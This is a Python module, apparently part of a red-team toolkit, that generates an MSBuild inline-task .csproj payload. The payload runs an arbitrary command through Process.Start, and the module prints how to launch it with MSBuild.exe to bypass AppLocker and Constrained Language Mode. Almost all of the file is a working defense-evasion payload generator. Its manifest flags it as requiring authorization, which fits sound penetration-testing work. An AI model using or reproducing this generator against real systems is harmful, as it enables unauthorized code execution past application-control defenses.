"""MSBuild.exe LOLBin — inline task execution, AppLocker/CLM bypass."""
import sys
from typing import Any

MANIFEST = {
    "capability_id": "adxpl.lolbins.msbuild.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["code_execution"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1127.001"],
}

MSBUILD_TEMPLATE = '''<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Exec">
    <ClassExample />
  </Target>
  <UsingTask TaskName="ClassExample" TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll">
    <ParameterGroup/>
    <Task>
      <Code Type="Class" Language="cs">
<![CDATA[
using System;
using System.Diagnostics;
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;
public class ClassExample : Task, ITask {{
  public override bool Execute() {{
    Process.Start("{cmd}");
    return true;
  }}
}}
]]>
      </Code>
    </Task>
  </UsingTask>
</Project>'''


def run(args: Any) -> int:
    command = getattr(args, "command", "calc.exe")
    generate = getattr(args, "generate_proj", False)

    if generate:
        proj = MSBUILD_TEMPLATE.format(cmd=command)
        print("[*] Generated MSBuild project:")
        print(proj)
        print("\n[*] Execute with:")
        print("  C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe payload.csproj")
        return 0

    print("[*] MSBuild.exe LOLBin:")
    print("  C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe payload.csproj")
    print("\n[*] Use --generate-proj to create the .csproj payload")
    print("[*] Bypasses AppLocker and Constrained Language Mode")
    return 0
